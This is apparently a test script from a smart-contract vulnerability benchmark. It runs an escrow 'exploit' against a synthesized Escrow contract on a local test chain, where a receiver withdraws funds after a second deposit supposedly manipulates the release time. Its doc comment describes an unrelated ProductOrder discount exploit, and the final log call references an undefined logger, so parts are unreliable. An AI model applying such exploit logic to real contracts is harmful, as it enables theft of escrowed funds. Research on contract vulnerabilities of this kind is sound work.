require('module-alias/register');
const fs = require('fs');
const path = require('path');
const assert = require('assert');
const chalk = require('chalk');
const { 
    extractSolcVersion, 
    compileWithVersion, 
    deployContract 
} = require('@lib/web3/deploy');


const getLogger = require('@lib/logging/logger').getLogger;
const exploit7Logger = getLogger('exploit7');


const { setTimeout } = require('timers');
const { sleep } = require('@lib/os/process');


// It seems module alias does not work with js path, so, we will resort to the dirty approach.
const projectRoot = path.resolve(__dirname, '..', '..', '..'); 
const contractsDir = path.join(projectRoot, './contracts');
const contractFileFullName = 'Escrow-7.sol';
let source = fs.readFileSync(path.join(contractsDir, 'src', 'synthesized', contractFileFullName), 'utf8');
let solcVersion = extractSolcVersion(source);

/**
 * Attempts to exploit a vulnerability in the ProductOrder smart contract.
 * 
 * The exploit involves applying a discount just before the discountEndTime, 
 * waiting for a few seconds, then making a transaction to pay for the order 
 * at the discounted price, and finally confirming the order.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the exploit is successful, `false` otherwise.
 * @throws {Error} If there's an error during the exploit process.
 */
async function exploit(web3, envInfo, contractAddress) {
    exploit7Logger.debug(` LINE 41`)
    try {
        exploit7Logger.debug(` LINE 43`)
        let { abi } = await compileWithVersion(source, contractFileFullName, 'Escrow', solcVersion);
        exploit7Logger.debug(` LINE 45`)
        let contractInstance = await new web3.eth.Contract(abi, contractAddress);
        exploit7Logger.debug(` LINE 47`)
        const firstSenderAccount = envInfo.accounts[0];
        exploit7Logger.debug(` LINE 49`)
        const firstReceiverAccount = envInfo.accounts[1];
        exploit7Logger.debug(` LINE 51`)
        const secondSenderAccount = envInfo.accounts[2];
        exploit7Logger.debug(` LINE 53`)
        const secondReceiverAccount = envInfo.accounts[3];
        exploit7Logger.debug(` LINE 55`)
        const firstEscrowAmount = web3.utils.toWei("1", "ether");
        exploit7Logger.debug(` LINE 57`)
        const secondEscrowAmount = web3.utils.toWei("2", "ether");
        exploit7Logger.debug(` LINE 59`)
        // First sender places funds in escrow
        await contractInstance.methods.placeInEscrow().send({
            from: firstSenderAccount,
            value: firstEscrowAmount,
            gas: 300000
        });
        exploit7Logger.debug(` LINE 66`)
        // Second sender places funds in escrow, manipulating the staticReleaseTime
        await contractInstance.methods.placeInEscrow().send({
            from: secondSenderAccount,
            value: secondEscrowAmount,
            gas: 300000
        });
        exploit7Logger.debug(` LINE 73`)
        // First receiver attempts to withdraw the funds using the manipulated release time
        const withdrawReceipt = await contractInstance.methods.withdrawFromEscrow().send({
            from: firstReceiverAccount,
            gas: 300000
        });
        exploit7Logger.debug(` LINE 79`)
        if (withdrawReceipt.status) {
            console.log("Exploit successful! First receiver withdrew funds using manipulated release time from second sender.");
            exploit7Logger.debug(` LINE 82`)
            return true;
        } else {
            exploit7Logger.debug(` LINE 85`)
            console.log("Exploit failed!");
            return false;
        }
    } catch (error) {
        exploit7Logger.debug(` LINE 90`)
        console.error(error.stack);
        return false;
    }
}
















/**
 * Executes the exploit and checks its result
 * 
 * This function will run the exploit and then verify if the exploit has 
 * yielded the predicted result. If the exploit is successful, a success 
 * message is displayed, otherwise an error message is shown.
 * 
 * @param {Object} web3 - The Web3 instance.
 * @param {Object} envInfo - An object containing environment information such as accounts, privateKeys, and rpcAddress.
 * @returns {Promise<boolean>} A promise that resolves to `true` if the test is successful, `false` otherwise.
 * @throws {Error} If there's an error during the test execution.
 */
module.exports = async function runTests(web3, envInfo, contractAddress) {
    // envInfo.accounts, envInfo.privateKeys, and envInfo.rpcAddress should be available from Anvil 
    
    // Execute the exploit
    let result = await exploit(web3, envInfo, contractAddress);

    // See if exploit has yielded the predicted result (a very manual oracle!)
    assert.strictEqual(result, true, "Exploit did not yield the expected result");
    logger.info(chalk.green("Exploit successful!"));

    return result; 
}
